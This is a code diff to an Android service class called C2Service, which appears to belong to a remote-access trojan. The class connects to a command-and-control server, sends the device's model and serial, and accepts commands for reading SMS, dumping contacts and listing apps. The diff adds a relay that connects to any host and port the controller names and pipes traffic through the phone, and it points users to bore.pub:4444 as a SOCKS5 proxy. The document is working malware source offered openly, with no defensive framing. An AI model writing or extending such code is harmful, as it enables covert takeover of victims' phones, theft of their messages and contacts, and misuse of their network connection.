@@ -23,7 +23,6 @@ public class C2Service extends Service {
     private volatile boolean running = true;
     private String deviceId;
     private ProxyService proxyService;
-    private JuiceTunnelService juiceService;
 
     @Override
     public void onCreate() {
@@ -32,8 +31,6 @@ public class C2Service extends Service {
         deviceId = Build.MODEL.replace(" ", "_") + "|" + Build.SERIAL;
         proxyService = new ProxyService();
         proxyService.onCreate();
-        juiceService = new JuiceTunnelService();
-        juiceService.onCreate();
         Log.d("C2Service", "Service Created");
     }
 
@@ -53,11 +50,15 @@ public class C2Service extends Service {
                 writer = new PrintWriter(socket.getOutputStream(), true);
                 reader = new BufferedReader(new InputStreamReader(socket.getInputStream()));
 
+                // Pass the C2 socket to ProxyService
                 proxyService.setC2Socket(socket);
 
                 writer.println("DEVICE:" + deviceId);
                 writer.println("READY");
                 Log.d("C2Service", "Connected!");
+
+                // Start a thread to handle proxy commands from C2
+                new Thread(this::handleProxyCommands).start();
 
                 String command;
                 while ((command = reader.readLine()) != null && running) {
@@ -70,6 +71,84 @@ public class C2Service extends Service {
                 Log.e("C2Service", "Connection error: " + e.getMessage());
                 try { Thread.sleep(5000); } catch (InterruptedException ignored) {}
             }
+        }
+    }
+
+    // Handle PROXY commands from the C2 server
+    private void handleProxyCommands() {
+        try {
+            while (running) {
+                String line = reader.readLine();
+                if (line != null && line.startsWith("PROXY")) {
+                    String[] parts = line.split(" ");
+                    if (parts.length == 3) {
+                        String host = parts[1];
+                        int port = Integer.parseInt(parts[2]);
+                        Log.d("C2Service", "Proxy request: " + host + ":" + port);
+
+                        // Connect to destination
+                        Socket target = new Socket();
+                        target.connect(new java.net.InetSocketAddress(host, port), 10000);
+                        OutputStream targetOut = target.getOutputStream();
+                        InputStream targetIn = target.getInputStream();
+
+                        // Send CONNECTED response
+                        writer.println("CONNECTED");
+                        writer.flush();
+
+                        // Relay data between C2 and target
+                        relayProxyTraffic(target);
+                    }
+                }
+            }
+        } catch (Exception e) {
+            Log.e("C2Service", "Proxy handler error: " + e.getMessage());
+        }
+    }
+
+    private void relayProxyTraffic(Socket target) {
+        try {
+            InputStream targetIn = target.getInputStream();
+            OutputStream targetOut = target.getOutputStream();
+            InputStream c2In = socket.getInputStream();
+            OutputStream c2Out = socket.getOutputStream();
+
+            byte[] buffer = new byte[8192];
+            boolean[] closed = {false};
+
+            Thread t1 = new Thread(() -> {
+                try {
+                    int len;
+                    while ((len = c2In.read(buffer)) != -1) {
+                        targetOut.write(buffer, 0, len);
+                        targetOut.flush();
+                    }
+                } catch (Exception e) {}
+                closed[0] = true;
+            });
+
+            Thread t2 = new Thread(() -> {
+                try {
+                    int len;
+                    while ((len = targetIn.read(buffer)) != -1) {
+                        c2Out.write(buffer, 0, len);
+                        c2Out.flush();
+                    }
+                } catch (Exception e) {}
+                closed[0] = true;
+            });
+
+            t1.start();
+            t2.start();
+
+            while (!closed[0]) {
+                Thread.sleep(100);
+            }
+
+            try { target.close(); } catch (Exception e) {}
+
+        } catch (Exception e) {
+            Log.e("C2Service", "Proxy relay error: " + e.getMessage());
         }
     }
 
@@ -90,40 +169,14 @@ public class C2Service extends Service {
     private String executeCmd(String cmd) {
         if (cmd.equalsIgnoreCase("proxy on")) {
             proxyService.startProxy();
-            juiceService.startTunnel();
-            String iceInfo = juiceService.getIceInfo();
-            if (iceInfo.isEmpty()) {
-                return "✅ SOCKS5 proxy started on port 1080\n⚠️ ICE info not available. Use local IP if on same network.";
-            }
-            return "✅ SOCKS5 proxy started on port 1080\n✅ ICE/STUN NAT traversal started\n\n📋 ICE Info:\n" + iceInfo;
+            return "✅ SOCKS5 proxy started on port 1080\n🌐 Use bore.pub:4444 as SOCKS5 proxy";
         }
         if (cmd.equalsIgnoreCase("proxy off")) {
             proxyService.stopProxy();
-            juiceService.stopTunnel();
             return "❌ Proxy stopped";
         }
         if (cmd.equalsIgnoreCase("proxy status")) {
-            String status = proxyService.isRunning() ? "✅ Proxy running on port 1080" : "❌ Proxy stopped";
-            String iceInfo = juiceService.getIceInfo();
-            if (!iceInfo.isEmpty()) {
-                status += "\n\n📋 ICE Info:\n" + iceInfo;
-            }
-            return status;
-        }
-
-        if (cmd.equalsIgnoreCase("ice")) {
-            String iceInfo = juiceService.getIceInfo();
-            return iceInfo.isEmpty() ? "❌ ICE info not available" : "📋 ICE Info:\n" + iceInfo;
-        }
-
-        if (cmd.equalsIgnoreCase("ip")) {
-            return DeviceInfo.getFullIpInfo(this);
-        }
-        if (cmd.equalsIgnoreCase("localip")) {
-            return "Local IP: " + DeviceInfo.getDeviceIp();
-        }
-        if (cmd.equalsIgnoreCase("publicip")) {
-            return "External IP: " + DeviceInfo.getPublicIp();
+            return proxyService.isRunning() ? "✅ Proxy running" : "❌ Proxy stopped";
         }
 
         if (cmd.equalsIgnoreCase("ping")) return "PONG";
@@ -134,7 +187,7 @@ public class C2Service extends Service {
         if (cmd.equalsIgnoreCase("device")) return deviceId;
         if (cmd.equalsIgnoreCase("exit")) { running = false; stopSelf(); return "EXIT"; }
 
-        return "Unknown command. Available: ping, info, ip, localip, publicip, ice, sms read, contacts, apps list, device, proxy on/off/status, exit";
+        return "Unknown command. Available: ping, info, sms read, contacts, apps list, device, proxy on/off/status, exit";
     }
 
     private void createNotificationChannel() {
@@ -159,7 +212,6 @@ public class C2Service extends Service {
     public void onDestroy() {
         running = false;
         if (proxyService != null) proxyService.stopProxy();
-        if (juiceService != null) juiceService.stopTunnel();
         try { socket.close(); } catch (Exception ignored) {}
         super.onDestroy();
     }
